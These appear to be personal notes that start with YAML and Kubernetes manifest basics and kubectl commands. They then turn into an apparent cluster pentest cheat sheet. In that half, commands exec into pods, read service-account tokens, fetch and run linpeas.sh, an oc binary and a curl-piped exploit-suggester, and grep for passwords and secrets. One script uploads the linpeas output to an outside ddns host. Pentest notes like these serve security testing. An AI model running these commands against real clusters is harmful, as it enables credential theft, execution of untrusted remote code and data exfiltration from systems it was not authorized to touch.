YAML-
1) key-value pairs:
    Fruit: Apple
    Vegetale: Carrot
    Liquid: Water

2) Array/Lists-
    Fruits:
    -   Orange
    -   Apple
    -   Banana

    Vegetables:
    -   Carrot
    -   Cauliflower
    -   mushroom

3) Dictionary:
    Banana:
        Calories: 195
        Fat: 0.4g
        Carbs: 27g

    Grapes:
        Calories: 195
        Fat: 0.4g
        Carbs: 27g


----------------------------------------------------------------------
Example 1 --> pod-definition.yml

apiVersion: v1
kind: Pod
metadata:
    name: myapp-pod
    labels:
        app: myapp
        type: front-end
spec:
    containers:
        - name: nginx-container
          image: nginx


Example 2 -->

apiVersion: v1
kind: Pod
metadata:
  name: postgres
  labels:
    tier: db-tier
spec:
  containers:
    - name: postgres
      image: postgres
      env:
       - name: POSTGRES_PASSWORD
         value: mysecretpassword
----------------------------------------------------------------------Commands
kubectl get all
kubectl get pods
kubectl describe pod myapp-pod
kubectl create -f pod.yml
kubectl version
kubectl describe nodes
kubectl delete pod <pod_name>
kubectl edit pod <pod_name>
kubectl apply -f <pod-definition.yaml>
kubectl run redis --image=redis123 --dry-run=client -o yaml > pod.yml

#Scaling replicaSets
kubectl scale rs <replica-set-name> --replicas=5

#modifying image in deployment
kubectl set image deployment/myapp-deployment \nginx=nginx:1.9.1

kubectl rollout status deployment.apps/myapp-deployment

kubectl rollout history deployment.apps/myapp-deployment

#recording the cause of change
kubectl create -f deploymnt.yml --record

kubectl rollout undo deployment/myapp-deployment
---------------------------------------------------------------------Replicaset
apiVersion: apps/v1
kind: ReplicaSet
metadata:
    name: myapp-replica
    labels:
        app: myapp
spec:
    selector:
        matchLabels:
            env: production
    replicas: 3
    template:
        metadata:
            name: myapp-pod
            labels:
                app: myapp
                type: front-end
            spec:
                containers:
                    -   name: nginx-container
                        image: nginx

--------------------------------------------------------------------Deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deployment-1
  labels:
      app: mywebsite
      tier: frontend
spec:
  replicas: 2
  selector:
    matchLabels:
      name: busybox-pod
  template:
    metadata: 
      labels:
        name: busybox-pod
    spec:
      containers:
      - name: busybox-container
        image: busybox888
        command:
        - sh
        - "-c"
        - echo Hello Kubernetes! && sleep 3600


#Deployment stratergies:
1) Recreate
2) Rolling update

----------------------------------------------------------------Services
apiVersion: v1
kind: Service
metadata:
  name: weapp-service
spec:
  type: NodePort
  ports:
    - targetPort: 8080
      port: 8080
      nodePort: 30080
  selector:
    name: simple-webapp





Services allow communication between different objects.

- For port forwarding we have have NodePort Service
        - It exposes internal pod to the ip of node in which pod is running.
        -Nord port range:
            30000-32767
- For Grouping similar pods, we have CluserIP service



ibmcloud login --sso
ibmcloud ks clusters
ibmcloud ks clusters config --cluster <cluster_name>
kubectl get all
kubectl cluster-info

#checking current cluster
kubectl config current-context

#checking other clusters
kubectl config view
kubectl get svc -n "namespace"
kubectl get routes -n <namespace>
kubectl get secrets -n <namespaces>
kubectl get pod/test-pod -n <namespace> -o yaml > test.yml

oc whoami
#
oc whoami -t
oc get rolebindings
oc get rolebindings -A
oc get clusterrolebindings -A
oc describe role <role-name>
oc cluster-info
oc get projects | grep -i 'cpd'


#RBAC
kubectl auth can-i --list
kubectl -n "app" exec -it dbos-master-5ddc69bb49-qchwq -c dbos-master --  /bin/sh -c 'cd /tmp && /bin/sh -c "curl --silent -LO https://raw.githubusercontent.com/pswalia5u/static_binaries/main/oc" && chmod +x * && ./oc auth can-i --list'
kubectl auth can-i --list --token=<Token>


/var/run/secrets/kubernetes.io/
/var/run/secrets/kubernetes.io/serviceaccount

https://ibm.webex.com/ibm/url.php?frompanel=false&gourl=https%3A%2F%2Fmirror.openshift.com%2Fpub%2Fopenshift-v4%2Fclients%2Foc%2F4.6%2Flinux%2Foc.tar.gz

#Decode token
kubectl -n "app" exec -it "backend-service-7b85b8f576-vbjv4" -c backend-service --  /bin/sh -c 'cd /tmp && /bin/sh -c "curl --silent -LO https://raw.githubusercontent.com/pswalia5u/static_binaries/main/oc" && chmod +x * && ./oc whoami -t' | awk -F '.' '{print $2}' | base64 -d | jq

kubectl -n "ivan-pentest-rc3" exec -it "ibm-zoscb-manager-zoscb-pentest-rc3-6c7c4798f8-64t5j" -c manager --  /bin/bash -c 'cd /tmp && cat /var/run/secrets/kubernetes.io/serviceaccount/token' | awk -F '.' '{print $2}' | base64 -d | jq

kubectl -n "app" exec -it "backend-service-7b85b8f576-vbjv4" -c backend-service --  /bin/sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' | awk -F '.' '{print $2}' | base64 -d | jq

# Look for permissions for these ojects
pods
secrets
deployments
configmaps
services


#kube-hunter
kubectl -n "cpd-instance" delete job kube-hunter
kubectl -n "cpd-operators" create -f ./kube-hunter-job.yml
kubectl -n "cpd-instance" logs kube-hunter-4gzrv | tee kube-hunter-cpd-instance.txt

#list images
kubectl get pods -n dp-setup-1 -o=custom-columns=NAME:.metadata.name,CONTAINERS:.spec.containers[*].image

kubectl get pods -n dp-setup-1 -o=custom-columns=NAME:.metadata.name,CONTAINERS:.spec.containers[*].image | grep -i ftm-artifacts-base | awk '{print $1}' >> scope-pods.txt

#list containers in pod
kubectl get pods -n app -o=custom-columns=NAME:.metadata.name,CONTAINERS:.spec.containers[*].name
kubectl get pods c-ibm-dmc-1645074785578890-redis-m-0 -n cpd-instance -o jsonpath='{.spec.containers[*].name}'
kubectl get pods <pod> -n <namespace> -o jsonpath='{.spec.containers[*].name}'

#shell into container pod 
kubectl -n "cpd-instance" exec -it "c-ibm-dmc-1645074785578890-redis-m-0" -c db -- /bin/bash -c 'cd /tmp && /bin/bash && curl -OL https://github.com/carlospolop/PEASS-ng/releases/download/20220220/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.out'

kubectl -n "cpd-instance" exec -it "c-ibm-dmc-1645074785578890-redis-m-0" -c proxy --  /bin/bash -c 'cd /tmp && /bin/bash -c "curl -OL https://github.com/carlospolop/PEASS-ng/releases/download/20220220/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh > linpeas.out"'

#linpeas.sh
kubectl -n "$1" exec -it "$2" -c "$3" --  /bin/bash -c "cd /tmp && /bin/bash -c \"curl -OL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh > linpeas_$2_$3.out\" ; curl -F \"file=@linpeas_$2_$3.out\" http://pswalia2u.ddns.net:8000/"

curl -OL https://github.com/carlospolop/PEASS-ng/releases/download/20220220/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.out

kubectl -n <namespace> exec -it <pod-name> -c <container-name> -- /bin/bash

#getting yaml from pod
kubectl get -n "cpd-instance" pod "c-ibm-dmc-1645074785578890-redis-m-0" -o yaml

env | grep -i -E "pass|username|key|secret"
grep -R -i --color  -E "pass|username|key|secret" *
egrep -ir 'pass|token|key|secret' /opt

#drop all
kubectl -n "cpd-instance" get pod "c-ibm-dmc-1645074785578890-redis-m-1"  -o json | jq '.spec.containers[].securityContext'


#ReadonlyRootfilesystem
mount | grep -i 'rw'
cat /proc/mount | grep -i 'rw'

#Resource quotas:
kubectl describe namespace <namespcace>

#Seccomp
Annotation level
Security context level


#kernel Vulns
kubectl -n "dp-setup-1" exec -it ftm-ace-dp-ip-misc-app-dp-setup-1-65f484c58c-xzk8k -c ace-dp-ip-misc-app --  /bin/bash -c "curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh "

#port-forwarding(Exposing internal services)
kubectl port-forward mongo-75f59d57f4-4nd6q 28015:27017


#Network Policies
1)from within the namepsace
2)from other namespace
3)Check acccess via port forwarding  to restricted pod
4)Outbound/egress policies not set(Internet access)

curl -k "https://${my_api_server}:6443/version";
curl -k "https://${my_api_server}:6443/api";
curl -k "https://${my_api_server}:6443/api/v1";
curl -k "https://${my_api_server}:6443/api/v1/namespaces";
curl -k "https://${my_api_server}:6443/api/v1/namespaces/<namespace>/pods";
curl -k "https://${my_api_server}:6443/apis";
curl -k "https://${my_api_server}:6443/apis/";
curl -k "https://${my_api_server}:6443/apis/apps";
curl -k "https://${my_api_server}:6443/apis/apps/v1";
curl -k "https://${my_api_server}:6443/apis/apps/v1beta1";
curl -k "https://${my_api_server}:6443/apis/apps/v1beta2";
curl -k "https://${my_api_server}:6443/apis/authentication.k8s.io";
curl -k "https://${my_api_server}:6443/apis/batch/v1";
curl -k "https://${my_api_server}:6443/apis/certificates.k8s.io";
